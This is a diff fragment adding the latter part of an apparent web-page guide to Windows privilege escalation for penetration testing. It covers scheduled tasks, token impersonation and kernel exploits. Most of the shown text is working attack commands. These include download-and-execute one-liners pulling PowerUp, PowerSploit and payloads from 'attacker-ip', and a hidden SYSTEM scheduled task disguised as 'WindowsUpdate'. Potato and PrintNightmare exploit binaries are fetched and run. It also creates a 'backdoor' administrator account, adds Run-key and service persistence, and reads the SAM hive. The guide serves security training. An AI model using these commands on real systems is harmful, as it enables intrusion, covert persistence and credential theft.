+</span><span class="c"># Analyze current arguments</span><span class="w">
+</span><span class="n">Write-Output</span><span class="w"> </span><span class="s2">"Current arguments: </span><span class="si">$(</span><span class="nv">$action</span><span class="o">.</span><span class="nf">Arguments</span><span class="si">)</span><span class="s2">"</span><span class="w">
+
+</span><span class="c"># Modify task to include malicious arguments (if permissions allow)</span><span class="w">
+</span><span class="nv">$newAction</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-ScheduledTaskAction</span><span class="w"> </span><span class="nt">-Execute</span><span class="w"> </span><span class="nv">$action</span><span class="o">.</span><span class="nf">Execute</span><span class="w"> </span><span class="nt">-Argument</span><span class="w"> </span><span class="s2">"malicious_args"</span><span class="w">
+</span><span class="n">Set-ScheduledTask</span><span class="w"> </span><span class="nt">-TaskName</span><span class="w"> </span><span class="nv">$task</span><span class="o">.</span><span class="nf">TaskName</span><span class="w"> </span><span class="nt">-Action</span><span class="w"> </span><span class="nv">$newAction</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="powerup-integration-1">PowerUp Integration</h3>
+
+<p><strong>Automated scheduled task analysis:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Import PowerUp</span><span class="w">
+</span><span class="n">IEX</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://attacker-ip/PowerUp.ps1'</span><span class="p">)</span><span class="w">
+
+</span><span class="c"># Find vulnerable scheduled tasks</span><span class="w">
+</span><span class="n">Get-ModifiableScheduledTaskFile</span><span class="w">
+
+</span><span class="c"># Check for unquoted paths in tasks</span><span class="w">
+</span><span class="n">Get-UnquotedService</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">ServiceName</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"*Task*"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="manual-task-creation">Manual Task Creation</h3>
+
+<p><strong>Create persistence task (if permissions allow):</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Create action</span><span class="w">
+</span><span class="nv">$action</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-ScheduledTaskAction</span><span class="w"> </span><span class="nt">-Execute</span><span class="w"> </span><span class="s2">"powershell.exe"</span><span class="w"> </span><span class="nt">-Argument</span><span class="w"> </span><span class="s2">"-WindowStyle Hidden -Command 'IEX (New-Object Net.WebClient).DownloadString(\"</span><span class="nx">http://attacker-ip/payload.ps1\</span><span class="s2">")'"</span><span class="w">
+
+</span><span class="c"># Create trigger (daily at logon)</span><span class="w">
+</span><span class="nv">$trigger</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-ScheduledTaskTrigger</span><span class="w"> </span><span class="nt">-AtLogOn</span><span class="w">
+
+</span><span class="c"># Create principal (run as SYSTEM if possible)</span><span class="w">
+</span><span class="nv">$principal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-ScheduledTaskPrincipal</span><span class="w"> </span><span class="nt">-UserId</span><span class="w"> </span><span class="s2">"SYSTEM"</span><span class="w"> </span><span class="nt">-LogonType</span><span class="w"> </span><span class="nx">ServiceAccount</span><span class="w">
+
+</span><span class="c"># Register task</span><span class="w">
+</span><span class="n">Register-ScheduledTask</span><span class="w"> </span><span class="nt">-TaskName</span><span class="w"> </span><span class="s2">"WindowsUpdate"</span><span class="w"> </span><span class="nt">-Action</span><span class="w"> </span><span class="nv">$action</span><span class="w"> </span><span class="nt">-Trigger</span><span class="w"> </span><span class="nv">$trigger</span><span class="w"> </span><span class="nt">-Principal</span><span class="w"> </span><span class="nv">$principal</span><span class="w"> </span><span class="nt">-Description</span><span class="w"> </span><span class="s2">"Windows Update Check"</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="32-using-exploits">3.2 Using Exploits</h2>
+
+<p>Exploits targeting Windows vulnerabilities can provide direct privilege escalation paths. This section covers application exploits, kernel exploits, and privilege abuse techniques.</p>
+
+<h3 id="types-of-privilege-escalation-exploits">Types of Privilege Escalation Exploits</h3>
+
+<p><strong>1. Application-Based Vulnerabilities</strong></p>
+<ul>
+  <li>Third-party software running with elevated privileges</li>
+  <li>Vulnerable system applications</li>
+  <li>Service exploitation</li>
+</ul>
+
+<p><strong>2. Windows Kernel Exploits</strong></p>
+<ul>
+  <li>Direct kernel vulnerability exploitation</li>
+  <li>Memory corruption bugs</li>
+  <li>Logic flaws in kernel components</li>
+</ul>
+
+<p><strong>3. Privilege Abuse</strong></p>
+<ul>
+  <li>Misuse of assigned Windows privileges</li>
+  <li>Token manipulation</li>
+  <li>Impersonation attacks</li>
+</ul>
+
+<h3 id="kernel-exploit-methodology">Kernel Exploit Methodology</h3>
+
+<p><strong>System reconnaissance:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Get Windows version and build (see section 1.2 for full systeminfo usage)</span><span class="w">
+</span><span class="n">systeminfo</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">/B</span><span class="w"> </span><span class="nx">/C:</span><span class="s2">"OS Name"</span><span class="w"> </span><span class="nx">/C:</span><span class="s2">"OS Version"</span><span class="w"> </span><span class="nx">/C:</span><span class="s2">"System Type"</span><span class="w">
+
+</span><span class="c"># Check installed patches</span><span class="w">
+</span><span class="n">Get-CimInstance</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">win32_quickfixengineering</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Description</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"Security Update"</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Sort-Object</span><span class="w"> </span><span class="nx">InstalledOn</span><span class="w">
+</span><span class="n">wmic</span><span class="w"> </span><span class="nx">qfe</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nx">brief</span><span class="w">
+</span><span class="n">Get-HotFix</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Sort-Object</span><span class="w"> </span><span class="nx">InstalledOn</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Privilege assessment:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Current user privileges (core commands from section 1.2)</span><span class="w">
+</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">
+</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/all</span><span class="w">
+
+</span><span class="c"># Check for specific exploitation privileges</span><span class="w">
+</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"SeImpersonate\|SeDebug\|SeBackup\|SeRestore\|SeLoad\|SeTakeOwnership"</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Vulnerability research process:</strong></p>
+<ol>
+  <li>Identify Windows version and build number</li>
+  <li>Cross-reference with CVE databases</li>
+  <li>Check for available public exploits</li>
+  <li>Verify patch status</li>
+  <li>Test in controlled environment first</li>
+</ol>
+
+<h3 id="common-windows-privileges-for-escalation">Common Windows Privileges for Escalation</h3>
+
+<p><strong>SeImpersonatePrivilege:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check if current user has impersonation privilege</span><span class="w">
+</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"SeImpersonatePrivilege"</span><span class="w">
+
+</span><span class="c"># Common accounts with this privilege:</span><span class="w">
+</span><span class="c"># - IIS_IUSRS</span><span class="w">
+</span><span class="c"># - LOCAL SERVICE</span><span class="w">
+</span><span class="c"># - NETWORK SERVICE  </span><span class="w">
+</span><span class="c"># - SERVICE accounts</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>SeDebugPrivilege:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Allows debugging any process (including SYSTEM processes)</span><span class="w">
+</span><span class="c"># Can be used to inject code into privileged processes</span><span class="w">
+
+</span><span class="c"># Check for debug privilege</span><span class="w">
+</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"SeDebugPrivilege"</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>SeBackupPrivilege:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Allows backing up any file (bypassing ACLs)</span><span class="w">
+</span><span class="c"># Can read sensitive files like SAM database</span><span class="w">
+
+</span><span class="c"># Check for backup privilege</span><span class="w">
+</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"SeBackupPrivilege"</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="token-impersonation-techniques">Token Impersonation Techniques</h3>
+
+<p><strong>Named Pipe Impersonation:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Concept: Coerce privileged process to connect to controlled named pipe</span><span class="w">
+</span><span class="c"># Tools: RottenPotato, JuicyPotato, PrintSpoofer, SigmaPotato</span><span class="w">
+
+</span><span class="c"># Download and use SigmaPotato</span><span class="w">
+</span><span class="n">iwr</span><span class="w"> </span><span class="nt">-uri</span><span class="w"> </span><span class="nx">http://attacker-ip/SigmaPotato.exe</span><span class="w"> </span><span class="nt">-Outfile</span><span class="w"> </span><span class="nx">SigmaPotato.exe</span><span class="w">
+
+</span><span class="c"># Execute command as SYSTEM (using standard payload pattern)</span><span class="w">
+</span><span class="o">.</span><span class="n">\SigmaPotato.exe</span><span class="w"> </span><span class="s2">"net user backdoor Password123! /add"</span><span class="w">
+</span><span class="o">.</span><span class="n">\SigmaPotato.exe</span><span class="w"> </span><span class="s2">"net localgroup administrators backdoor /add"</span><span class="w">
+
+</span><span class="c"># Alternative: Get SYSTEM shell</span><span class="w">
+</span><span class="o">.</span><span class="n">\SigmaPotato.exe</span><span class="w"> </span><span class="s2">"powershell -Command Start-Process cmd -Verb RunAs"</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Advanced impersonation tools:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># JuicyPotato (older Windows versions)</span><span class="w">
+</span><span class="o">.</span><span class="n">\JuicyPotato.exe</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nx">1337</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">cmd.exe</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="p">{</span><span class="n">CLSID</span><span class="p">}</span><span class="w">
+
+</span><span class="c"># PrintSpoofer (newer Windows versions)</span><span class="w">
+</span><span class="o">.</span><span class="n">\PrintSpoofer.exe</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
+
+</span><span class="c"># GodPotato (Windows Server 2019/2022)</span><span class="w">
+</span><span class="o">.</span><span class="n">\GodPotato.exe</span><span class="w"> </span><span class="nt">-cmd</span><span class="w"> </span><span class="s2">"cmd /c whoami"</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="application-exploit-techniques">Application Exploit Techniques</h3>
+
+<p><strong>Vulnerable service exploitation:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Identify running services and versions</span><span class="w">
+</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nx">win32_service</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">State</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"Running"</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">PathName</span><span class="p">,</span><span class="w"> </span><span class="nx">StartName</span><span class="w">
+
+</span><span class="c"># Check for known vulnerable applications</span><span class="w">
+</span><span class="nv">$knownVulnApps</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="s2">"VNC"</span><span class="p">,</span><span class="w"> </span><span class="s2">"TeamViewer"</span><span class="p">,</span><span class="w"> </span><span class="s2">"FileZilla"</span><span class="p">,</span><span class="w"> </span><span class="s2">"Putty"</span><span class="p">)</span><span class="w">
+</span><span class="n">Get-ItemProperty</span><span class="w"> </span><span class="s2">"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"</span><span class="w"> </span><span class="o">|</span><span class="w"> 
+    </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nv">$knownVulnApps</span><span class="w"> </span><span class="o">-contains</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">DisplayName</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w">
+    </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">DisplayName</span><span class="p">,</span><span class="w"> </span><span class="nx">DisplayVersion</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Memory corruption exploitation:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Buffer overflow in privileged applications</span><span class="w">
+</span><span class="c"># Use tools like Metasploit or custom exploits</span><span class="w">
+
+</span><span class="c"># Example: Exploiting vulnerable service</span><span class="w">
+</span><span class="c"># 1. Identify buffer overflow vulnerability</span><span class="w">
+</span><span class="c"># 2. Generate shellcode payload</span><span class="w">
+</span><span class="c"># 3. Craft exploit to overwrite return address</span><span class="w">
+</span><span class="c"># 4. Execute with elevated privileges</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="kernel-exploit-examples">Kernel Exploit Examples</h3>
+
+<p><strong>CVE-2021-1675 (PrintNightmare):</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check if Print Spooler service is running</span><span class="w">
+</span><span class="n">Get-Service</span><span class="w"> </span><span class="nx">Spooler</span><span class="w">
+
+</span><span class="c"># Download and execute exploit</span><span class="w">
+</span><span class="n">iwr</span><span class="w"> </span><span class="nt">-uri</span><span class="w"> </span><span class="nx">http://attacker-ip/CVE-2021-1675.exe</span><span class="w"> </span><span class="nt">-Outfile</span><span class="w"> </span><span class="nx">printnightmare.exe</span><span class="w">
+</span><span class="o">.</span><span class="n">\printnightmare.exe</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Local privilege escalation exploits:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Common Windows 10/11 kernel exploits:</span><span class="w">
+</span><span class="c"># - CVE-2023-29360 (Windows Streaming Service)</span><span class="w">
+</span><span class="c"># - CVE-2022-21882 (Windows Kernel)</span><span class="w">
+</span><span class="c"># - CVE-2021-1732 (Windows Kernel)</span><span class="w">
+</span><span class="c"># - CVE-2020-17087 (Windows Kernel CNG.SYS)</span><span class="w">
+
+</span><span class="c"># General exploitation process:</span><span class="w">
+</span><span class="c"># 1. Download compiled exploit</span><span class="w">
+</span><span class="c"># 2. Transfer to target system</span><span class="w">
+</span><span class="c"># 3. Execute and verify privilege escalation</span><span class="w">
+</span><span class="c"># 4. Establish persistence if needed</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="exploit-safety-and-considerations">Exploit Safety and Considerations</h3>
+
+<p><strong>Pre-exploitation checklist:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 1. Backup critical system files</span><span class="w">
+</span><span class="c"># 2. Verify exploit compatibility</span><span class="w">
+</span><span class="c"># 3. Test in isolated environment</span><span class="w">
+</span><span class="c"># 4. Have system recovery plan</span><span class="w">
+</span><span class="c"># 5. Coordinate with client IT team</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>System stability verification:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check system resources before exploitation</span><span class="w">
+</span><span class="n">Get-Process</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Sort-Object</span><span class="w"> </span><span class="nx">CPU</span><span class="w"> </span><span class="nt">-Descending</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nt">-First</span><span class="w"> </span><span class="nx">10</span><span class="w">
+</span><span class="n">Get-Counter</span><span class="w"> </span><span class="s2">"\Memory\Available MBytes"</span><span class="w">
+</span><span class="n">Get-EventLog</span><span class="w"> </span><span class="nt">-LogName</span><span class="w"> </span><span class="nx">System</span><span class="w"> </span><span class="nt">-Newest</span><span class="w"> </span><span class="nx">10</span><span class="w"> </span><span class="nt">-EntryType</span><span class="w"> </span><span class="nx">Error</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="automated-exploit-frameworks">Automated Exploit Frameworks</h3>
+
+<p><strong>Metasploit integration:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># On Kali Linux</span>
+msfconsole
+use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+<span class="nb">set </span>SESSION 1
+exploit
+</code></pre></div></div>
+
+<p><strong>PowerShell exploitation frameworks:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># PowerSploit</span><span class="w">
+</span><span class="n">IEX</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://attacker-ip/PowerSploit.ps1'</span><span class="p">)</span><span class="w">
+
+</span><span class="c"># Empire/Starkiller</span><span class="w">
+</span><span class="c"># PowerShell Empire for post-exploitation</span><span class="w">
+
+</span><span class="c"># Covenant C2 framework  </span><span class="w">
+</span><span class="c"># .NET based command and control</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="exploit-mitigation-bypass">Exploit Mitigation Bypass</h3>
+
+<p><strong>ASLR/DEP bypass techniques:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Address Space Layout Randomization bypass</span><span class="w">
+</span><span class="c"># Data Execution Prevention bypass</span><span class="w">
+</span><span class="c"># Return Oriented Programming (ROP)</span><span class="w">
+</span><span class="c"># Jump Oriented Programming (JOP)</span><span class="w">
+
+</span><span class="c"># Check current mitigation status</span><span class="w">
+</span><span class="n">Get-ProcessMitigation</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s2">"process.exe"</span><span class="w">
+
+</span><span class="c"># Windows Defender bypass</span><span class="w">
+</span><span class="c"># AMSI bypass techniques</span><span class="w">
+</span><span class="c"># ETW bypass methods</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="post-exploitation-verification">Post-Exploitation Verification</h3>
+
+<p><strong>Confirm privilege escalation:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Verify new privileges (core commands from section 1.2)</span><span class="w">
+</span><span class="n">whoami</span><span class="w">
+</span><span class="nx">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">
+</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/groups</span><span class="w">
+
+</span><span class="c"># Test administrative access (standard pattern)</span><span class="w">
+</span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">testuser</span><span class="w"> </span><span class="nx">Password123</span><span class="o">!</span><span class="w"> </span><span class="nx">/add</span><span class="w">
+</span><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w"> </span><span class="nx">administrators</span><span class="w"> </span><span class="nx">testuser</span><span class="w"> </span><span class="nx">/add</span><span class="w">
+
+</span><span class="c"># Access protected resources</span><span class="w">
+</span><span class="n">dir</span><span class="w"> </span><span class="nx">C:\Windows\System32\config</span><span class="w">
+</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKLM\SAM</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Establish persistence:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Create backdoor user (standard pattern throughout guide)</span><span class="w">
+</span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">backdoor</span><span class="w"> </span><span class="nx">Password123</span><span class="o">!</span><span class="w"> </span><span class="nx">/add</span><span class="w">
+</span><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w"> </span><span class="nx">administrators</span><span class="w"> </span><span class="nx">backdoor</span><span class="w"> </span><span class="nx">/add</span><span class="w">
+</span><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w"> </span><span class="s2">"Remote Desktop Users"</span><span class="w"> </span><span class="nx">backdoor</span><span class="w"> </span><span class="nx">/add</span><span class="w">
+
+</span><span class="c"># Registry persistence</span><span class="w">
+</span><span class="n">reg</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="s2">"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="s2">"WindowsUpdate"</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/d</span><span class="w"> </span><span class="s2">"powershell.exe -WindowStyle Hidden -Command &lt;payload&gt;"</span><span class="w">
+
+</span><span class="c"># Service persistence</span><span class="w">
+</span><span class="n">sc</span><span class="w"> </span><span class="nx">create</span><span class="w"> </span><span class="s2">"WindowsUpdate"</span><span class="w"> </span><span class="nx">binpath</span><span class="o">=</span><span class="w"> </span><span class="s2">"cmd.exe /c &lt;payload&gt;"</span><span class="w"> </span><span class="n">start</span><span class="o">=</span><span class="w"> </span><span class="n">auto</span><span class="w">
+</span></code></pre></div></div>
+
+<hr />
+
+<p><em>Note: This completes the comprehensive Windows Privilege Escalation guide. Each section provides detailed technical commands, examples, and methodologies for effective privilege escalation on Windows systems.</em></p>
+
+</article>
+
+        </main>
+        
+        
+        <aside class="sidebar">
+            <nav class="docs-nav">
+                <h3>Linux Privilege Escalation</h3>
+                <ul>
+                    <li><a href="/docs/linux-privilege-escalation/#1-enumerating-linux">1. Enumerating Linux</a></li>
+                    <li><a href="/docs/linux-privilege-escalation/#2-exposed-confidential-information">2. Exposed Information</a></li>
+                    <li><a href="/docs/linux-privilege-escalation/#3-insecure-file-permissions">3. Insecure Permissions</a></li>
+                    <li><a href="/docs/linux-privilege-escalation/#4-insecure-system-components">4. System Components</a></li>
+                </ul>
+                
+                <h3>Windows Privilege Escalation</h3>
+                <ul>
+                    <li><a href="/docs/windows-privilege-escalation/">View Guide</a></li>
+                </ul>
+            </nav>
+        </aside>
+        
+    </div>
+    
+    <footer class="site-footer">
+    <div class="footer-content">
+        <p>&copy; 2024 Privilege Escalation Guide. Security research and penetration testing reference.</p>
+        <p>
+            <a href="https://github.com/medTrigui/privilege-escalation">GitHub</a> | 
+            <a href="https://gtfobins.org/">GTFOBins</a> | 
+            <a href="https://medtrigui.github.io/escabin/">Escabin</a>
+        </p>
+    </div>
+</footer>
+
+</body>
+</html>
